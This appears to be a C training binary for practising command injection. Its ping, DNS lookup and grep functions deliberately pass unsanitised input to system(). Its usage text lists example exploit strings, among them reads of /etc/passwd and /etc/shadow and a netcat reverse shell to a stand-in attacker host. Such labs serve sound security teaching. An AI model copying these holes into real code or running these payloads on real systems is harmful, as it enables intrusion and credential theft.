// Command injection vulnerability practice binary
// Purpose: Learn command injection exploitation
// Vulnerability: Unsafe system() call with user input

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void vulnerable_ping(char *host) {
    char command[256];
    
    printf("\n=== Executing ping command ===\n");
    printf("Target host: %s\n", host);
    
    // VULNERABILITY: Direct concatenation allows command injection
    snprintf(command, sizeof(command), "ping -c 1 %s", host);
    
    printf("Command: %s\n", command);
    printf("Executing...\n\n");
    
    // VULNERABILITY: Executes user-controlled command
    system(command);
}

void vulnerable_lookup(char *domain) {
    char command[256];
    
    printf("\n=== DNS Lookup ===\n");
    printf("Domain: %s\n", domain);
    
    // VULNERABILITY: Command injection via nslookup
    snprintf(command, sizeof(command), "nslookup %s", domain);
    
    printf("Command: %s\n", command);
    system(command);
}

void vulnerable_grep(char *pattern, char *file) {
    char command[512];
    
    printf("\n=== Searching file ===\n");
    printf("Pattern: %s\n", pattern);
    printf("File: %s\n", file);
    
    // VULNERABILITY: Both arguments can inject commands
    snprintf(command, sizeof(command), "grep '%s' %s", pattern, file);
    
    printf("Command: %s\n", command);
    system(command);
}

void create_test_file() {
    FILE *fp = fopen("/tmp/test.txt", "w");
    if (fp) {
        fprintf(fp, "This is line 1\n");
        fprintf(fp, "SECRET: password123\n");
        fprintf(fp, "This is line 3\n");
        fclose(fp);
        printf("Created test file: /tmp/test.txt\n");
    }
}

int main(int argc, char *argv[]) {
    printf("=== Command Injection Practice ===\n");
    
    if (argc < 2) {
        printf("\nUsage: %s <command> [args]\n", argv[0]);
        printf("Commands:\n");
        printf("  setup                    - Create test file\n");
        printf("  ping <host>              - Ping a host\n");
        printf("  lookup <domain>          - DNS lookup\n");
        printf("  grep <pattern> <file>    - Search in file\n");
        printf("\nPractice objectives:\n");
        printf("1. Understand command injection vulnerabilities\n");
        printf("2. Inject commands using shell metacharacters\n");
        printf("3. Chain multiple commands\n");
        printf("4. Bypass input validation\n");
        printf("\nExample exploits:\n");
        printf("  %s ping \"localhost; ls -la\"\n", argv[0]);
        printf("  %s ping \"localhost && cat /etc/passwd\"\n", argv[0]);
        printf("  %s ping \"localhost | whoami\"\n", argv[0]);
        printf("  %s ping \"localhost; nc -e /bin/sh attacker.com 4444\"\n", argv[0]);
        printf("  %s grep \"SECRET\" \"/tmp/test.txt; cat /etc/shadow\"\n", argv[0]);
        printf("  %s lookup \"google.com; id\"\n", argv[0]);
        return 1;
    }
    
    if (strcmp(argv[1], "setup") == 0) {
        create_test_file();
    } else if (strcmp(argv[1], "ping") == 0 && argc > 2) {
        vulnerable_ping(argv[2]);
    } else if (strcmp(argv[1], "lookup") == 0 && argc > 2) {
        vulnerable_lookup(argv[2]);
    } else if (strcmp(argv[1], "grep") == 0 && argc > 3) {
        vulnerable_grep(argv[2], argv[3]);
    } else {
        printf("Invalid command!\n");
    }
    
    return 0;
}
